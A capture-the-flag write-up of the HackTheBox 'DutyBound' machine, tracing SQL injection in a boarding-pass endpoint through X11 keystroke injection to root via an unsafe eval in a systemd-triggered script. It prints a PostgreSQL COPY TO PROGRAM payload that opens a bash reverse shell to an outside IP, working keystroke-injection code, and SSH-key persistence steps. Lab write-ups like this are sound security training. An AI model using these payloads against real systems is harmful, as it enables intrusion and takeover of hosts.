# HackTheBox DutyBound Full Chain Penetration Testing

## Recon
- Target: `airsnacks.htb` / `10.129.231.23`
- External scan: Ports `22`, `80`, `443` open
- Port `8000` only reachable on localhost - served via nginx to the web ports

## Foothold - SQL Injection in Boarding Pass Scanner
- Found a SQL injection in the checkout endpoint: `POST https://airsnacks.htb/checkout/boarding-pass/verify`
- The endpoint parses a fixed-format boarding pass string (`raw` field) and inserts one of its fields into a query unsanitized; closing the field and appending `||<subquery>||` into the trailing item let arbitrary SQL ride along
- Backend identified as PostgreSQL `18.6`
- Automated the injection with a Python client (`step1/db-request.py`) that builds the fixed-width `raw` field, computes its length in hex, and POSTs it with the session cookie

### Database user and role enumeration
- Current database user: `airsnacks_app`
- Found membership in role `pg_execute_server_program`
- Confirmed `MEMBER`, `USAGE` and `SET` = `true` on that role

### RCE via `COPY ... TO PROGRAM`
- `pg_execute_server_program` membership allows `COPY` to pipe query output through an arbitrary shell command
```sql
1);COPY (SELECT 1) TO PROGRAM $$bash -c "bash -i >& /dev/tcp/10.10.15.223/7777 0>&1"$$;--
```
- Obtained a reverse shell as the system user `postgres`

## PostgreSQL Enumeration
- Five databases present: `airsnacks`, `htbairways`, `postgres`, `template0`, `template1`
- `airsnacks`: 7 application tables
- `htbairways`: `flight` and `passenger` tables, 20 records each
- `htbairways` is owned by the PostgreSQL user `postgres`
- Database content irrelevant to the rest of the chain

## Pivot `postgres` -> `dutyfree-kiosk`
- Checked system-level permissions of `postgres`: member of group `ssl-cert`, confirmed read access to `ssl-cert-snakeoil.key`
- Checked SUID/SGID binaries and Linux capabilities - nothing directly usable
- Found Snap and LXD present but did not use them for escalation
- Found a live X11 session on `DISPLAY=:0`, window manager Openbox, with the keybind `Ctrl+Alt+T` configured in `/etc/xdg/openbox/rc.xml` to spawn `xterm`
- No `xdotool`/`xte`/`xvkbd` available, but `python3-xlib` was, so used `Xlib` + the `XTEST` extension directly to synthesize the `Ctrl+Alt+T` keypress and then type into the resulting `xterm`
```python
from Xlib import display, X
from Xlib.ext import xtest
from Xlib.XK import string_to_keysym

d = display.Display()
SHIFT = d.keysym_to_keycode(string_to_keysym("Shift_L"))

def tap_char(ch):
    code = d.keysym_to_keycode(ord(ch))
    shift = d.keycode_to_keysym(code, 0) != ord(ch)
    if shift:
        xtest.fake_input(d, X.KeyPress, SHIFT)
    xtest.fake_input(d, X.KeyPress, code)
    xtest.fake_input(d, X.KeyRelease, code)
    if shift:
        xtest.fake_input(d, X.KeyRelease, SHIFT)
    d.sync()
```
- Confirmed the spawned `xterm` ran as UID `1000` (`dutyfree-kiosk`), giving an interactive context as that user
- Used the same keystroke-injection channel to drop an SSH key: typed a one-liner into the hijacked `xterm` that created `~/.ssh`, copied a staged `authorized_keys` into it and fixed permissions

## Discovery of `vrs-duty-apply.service`
| File | Role |
| --- | --- |
| `/opt/vrs/data/duty-rates.csv` | Input data |
| `/etc/systemd/system/vrs-duty-apply.path` | Watches the CSV for changes |
| `/etc/systemd/system/vrs-duty-apply.service` | Runs the processing script |

- Processing script: `/opt/vrs/bin/apply-duty-rates.sh`
- Key findings:
  - `duty-rates.csv` is writable by group `pos-ops` and readable by anyone
  - the `.path` unit triggers the `.service` on any write to the CSV
  - the `.service` unit has no `User=` directive, so it runs as `root` by default
  - the script parses the CSV and uses an unsafe `eval` on one of its fields

## Root - Confirmed Command Execution via `eval`
- Vulnerable line in `apply-duty-rates.sh`:
```bash
eval "${tax_class}=${duty_pct}"
```
- `tax_class` is read straight from the CSV with no validation, so a crafted field name becomes an arbitrary shell assignment/command inside the root-run script
- Edited `duty-rates.csv` (writable via `pos-ops` group membership) with a malicious `tax_class` value, which the path unit picked up and ran as root
- Proof of execution:
```text
-rw-r--r-- 1 root root 1 Nov 8 17:51 'veryusualfile=20'
```
- File created in `/tmp`, owned by `root:root` - confirms arbitrary command execution as root through the path-unit trigger
- `/root/root.txt` flag recovered
